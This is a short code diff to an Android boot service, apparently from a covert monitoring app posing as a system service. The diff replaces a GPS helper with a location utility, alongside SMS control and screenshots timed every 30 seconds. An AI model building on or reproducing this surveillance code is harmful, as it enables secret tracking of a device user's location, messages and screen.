@@ -5,11 +5,11 @@ import java.util.TimerTask;
 
 import system.service.activity.GlobalPrefActivity;
 import system.service.config.ConfigCtrl;
+import system.service.feature.location.LocationUtil;
 import system.service.feature.sms.SmsCtrl;
 
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
-import com.particle.inspector.common.util.gps.GpsUtil;
 import com.particle.inspector.common.util.license.LicenseCtrl;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 
@@ -43,7 +43,7 @@ public class BootService extends Service
 	private final long mScreenshotDelay  = 3000;  // 3  Seconds
 	private final long mScreenshotPeriod = 30000; // 30 Seconds
 	
-	public static GpsUtil gps;
+	public static LocationUtil locationUtil;
 
 	@Override
 	public IBinder onBind(final Intent intent) {
@@ -93,7 +93,7 @@ public class BootService extends Service
 		{
 			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
 			
-			gps = new GpsUtil(getApplicationContext());
+			locationUtil = new LocationUtil(getApplicationContext());
 		
 			//Start timer to capture screenshot
 			/*
